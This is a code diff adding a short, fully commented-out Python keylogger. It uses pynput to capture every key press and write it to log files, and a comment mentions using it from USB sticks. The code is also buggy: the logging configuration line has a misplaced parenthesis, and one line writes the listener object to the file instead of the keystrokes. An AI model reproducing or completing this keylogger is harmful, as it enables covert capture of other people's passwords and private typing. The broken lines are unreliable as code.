@@ -1,0 +1,21 @@
+#import pynput
+#import logging
+
+#from pynput.keyboard import Key, Listener
+#log__dir=""
+
+#def on_press(key):
+#    logging.info(str(key))
+#    print( "{} pressed".format(key))
+
+#def on_release(key):
+ #   if key == Key.esc:
+ #       return False
+
+#with Listener(on_press=on_press, on_release=on_release) as Listener:
+#    Listener.join()
+
+    #with open("log.txt","a+", encoding="utf-8") as new_file:
+      #  new_file.write(Listener) optional for USB Sticks
+
+#logging.basicConfig(filename=log__dir + "userlogs.txt"), level=logging.DEBUG,format='%(asctime)s %(message)s'
